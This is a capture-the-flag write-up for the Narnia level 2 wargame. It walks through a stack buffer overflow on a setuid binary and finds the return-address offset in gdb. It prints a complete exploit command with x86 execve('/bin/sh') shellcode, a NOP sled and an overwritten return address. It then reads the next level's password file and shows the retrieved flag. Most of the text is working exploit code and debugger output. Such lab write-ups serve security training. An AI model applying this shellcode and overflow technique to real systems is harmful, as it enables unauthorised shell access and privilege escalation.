straight up a BufferOverflow exploit.

buffer only has size of 128 bytes
when we execute the binary with a string large than that => seg fault
./narnia2 $(python -c 'print ("A"*140)') => seg fault

playing around for a while, we know that the exploit needs to be 132 bytes long to hit eip
pop up gdb
r $(python -c'print("A"*130 + "B"*4)')')
Program received signal SIGSEGV, Segmentation fault.
0xf7004242 in ?? ()

We still have the previous shellcode, let's use that, the size of the shellcode is 28 bytes.
so the padding needs to be 104 + shellcode (28) = 132: this should overwrite $ebp
then overwrite eip with the new return address.

r $(python -c 'print("A"*104+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+ "B"*2)')

looking at the stack frame:

0xffffd7e0:     0x00000000      0x00000000      0xa1000000      0x9490d646
0xffffd7f0:     0x01d0982b      0xaa2cf939      0x691905a2      0x00363836
0xffffd800:     0x00000000      0x00000000      0x00000000      0x6e2f0000
0xffffd810:     0x696e7261      0x616e2f61      0x61696e72      0x41410032
0xffffd820:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd830:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd840:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd850:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd860:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd870:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd880:     0x41414141      0xc0314141      0x2f2f6850      0x2f686873
0xffffd890:     0x896e6962      0x89c189e3      0xcd0bb0c2      0x40c03180
0xffffd8a0:     0x424280cd      0x5f434c00      0x3d4c4c41      0x555f6e65

now change A to x90: no op

we can over write eip to like 0xffffd880, or 0xffffd870, those should be okay.

./narnia2 $(python -c 'print("\x90"*104+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90\xd8\xff\xff")')

so 104 bytes of NOP slide, 28 bytes of shellcode, and 4 bytes of new eip address. We have a new shell with uid of narnia3

cat /etc/narnia_pass/narnia3

flag retrieved: vaequeezee

